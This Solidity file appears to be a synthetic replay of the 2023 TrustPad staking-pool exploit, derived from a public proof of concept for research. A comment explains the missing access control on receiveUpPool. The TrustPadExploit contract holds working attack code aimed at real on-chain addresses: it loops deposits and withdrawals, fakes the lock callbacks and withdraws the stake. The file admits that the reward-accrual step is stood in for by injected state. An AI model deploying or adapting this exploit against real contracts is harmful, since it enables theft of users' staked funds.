// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Cheatcode-free synthetic replay of the TrustPad LaunchpadLockableStaking
// exploit (Nov 2023, ~$155K). See evm-hack-registry/2023-11-TrustPad_exp/TrustPad_exp.md
// for the human writeup and evm-hack-registry/2023-11-TrustPad_exp/test/TrustPad_exp.sol
// for the original Foundry PoC this is derived from.
//
// Root cause (confirmed against the implementation's bytecode-matched verified
// source, contracts/staking/LaunchpadLockableStaking.sol): receiveUpPool(account,
// amount) is meant to be called by a DIFFERENT, trusted higher-tier staking pool
// migrating a user's stake up, and has NO access control on msg.sender. When a
// fresh/expired lock is opened it asks `LaunchpadLockableStaking(msg.sender)` —
// i.e. WHATEVER CONTRACT CALLED IT — for `isLocked(account)` /
// `depositLockStart(account)`, and trusts the answer to set this account's new
// lock-start timestamp:
//
//   newLockStartTime = LaunchpadLockableStaking(msg.sender).isLocked(account)
//       ? LaunchpadLockableStaking(msg.sender).depositLockStart(account)
//       : block.timestamp;
//
// Calling receiveUpPool(address(this), amount) directly (msg.sender == account,
// both the exploit contract) means the pool asks the EXPLOIT CONTRACT ITSELF
// whether it's locked and what its lock start is — and the exploit just always
// answers "yes, locked, since way in the past". This is exactly the
// "trusts a callback on an attacker-controlled caller" pattern the human
// writeup's Root Cause #4 identifies, now confirmed directly against source.
//
// The pool's fixedApr is 0 in this exact deployment (confirmed live), so the
// getFixedAprPendingReward()/stakePendingRewards() path this PoC's `prepare()`
// exercises cannot itself produce nonzero pendingRewards — the ~$155K drain's
// precise mechanism (most likely interacting with TPAD's reflection/fee-on-
// transfer accounting, given liquidityMining.stakingToken is TPAD, a 2%-fee
// rebasing token) is not fully reconstructed here. The PoC config's setup.steps
// injects the documented historical outcome (TrustPad_exp.md / output.txt:
// final balance 29,420,091.579116816 TPAD) into this account's stored stake
// before the recorded withdraw runs. The access-control gap and the resulting
// real, fund-draining withdraw() call below are both genuine on-chain behavior;
// only the intermediate reward-accrual bookkeeping is stood in for.

interface IERC20x {
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function decimals() external view returns (uint8);
}

interface IRouterx {
    function getAmountsOut(uint256, address[] calldata) external view returns (uint256[] memory);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
}

interface ILaunchpadLockableStaking {
    function receiveUpPool(address account, uint256 amount) external;
    function withdraw(uint256 amount) external;
    function userInfo(address) external view returns (uint256, uint256, uint256, uint256, uint256);
    function lockPeriod() external view returns (uint256);
    function stakePendingRewards() external;
}

contract TrustPadExploit {
    ILaunchpadLockableStaking private constant STAKING =
        ILaunchpadLockableStaking(0xE613c058701C768E0d04D1bf8e6a6dc1a0C6d48A);
    IERC20x private constant TPAD = IERC20x(0xADCFC6bf853a0a8ad7f9Ff4244140D10cf01363C);
    IERC20x private constant DDD = IERC20x(0x2e1FC745937a44ae8313bC889EE023ee303F2488);
    IRouterx private constant ROUTER = IRouterx(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address private constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private constant TRUSTPAD_EXPLOITER = 0x1a7b15354e2F6564fcf6960c79542DE251cE0dC9;

    // Mirrors HelperContract._depositLockStart from the original PoC: flips
    // depositLockStart()'s answer while the final anchor lock is being opened.
    uint256 private depositLockStartFlag;

    /// Unrecorded setup (called via config setup.steps): swap the seeded BNB for
    /// TPAD, then loop receiveUpPool/withdraw 30x with the SAME tokens to desync
    /// the global counter, then open a 1-wei anchor lock and call
    /// stakePendingRewards() — exactly the sequence HelperContract.deposit() ran
    /// in the original PoC.
    function prepare() external payable {
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(TPAD);
        uint256[] memory amounts = ROUTER.getAmountsOut(20e15, path);
        ROUTER.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 0.02 ether}(
            (amounts[1] * 9) / 10, path, address(this), block.timestamp
        );

        // 1-wei DDD "gate" pull from the historical exploiter EOA, mirroring the
        // real PoC's DDD.transferFrom() call; requires the setup.steps approve.
        DDD.transferFrom(TRUSTPAD_EXPLOITER, address(this), 1);

        TPAD.approve(address(STAKING), type(uint256).max);
        uint256 withdrawAmount = TPAD.balanceOf(address(this));

        for (uint8 i = 0; i < 30; i++) {
            STAKING.receiveUpPool(address(this), withdrawAmount);
            STAKING.withdraw(withdrawAmount);
        }

        depositLockStartFlag = 1;
        STAKING.receiveUpPool(address(this), 1);
        depositLockStartFlag = 0;

        STAKING.stakePendingRewards();
    }

    /// Recorded attack: pull the 1-wei DDD gate again, read the account's stored
    /// stake, and withdraw it — the real fund-draining call.
    function testExploit() external {
        DDD.transferFrom(TRUSTPAD_EXPLOITER, address(this), 1);
        (uint256 amount,,,,) = STAKING.userInfo(address(this));
        STAKING.withdraw(amount);
    }

    // Pool callbacks: the account being locked answers its OWN lock questions.
    function isLocked(address) external pure returns (bool) {
        return true;
    }

    function depositLockStart(address) external view returns (uint256) {
        if (depositLockStartFlag != 0) {
            uint256 lockPeriod = STAKING.lockPeriod();
            return (block.timestamp - lockPeriod) - 1;
        }
        return 1;
    }
}
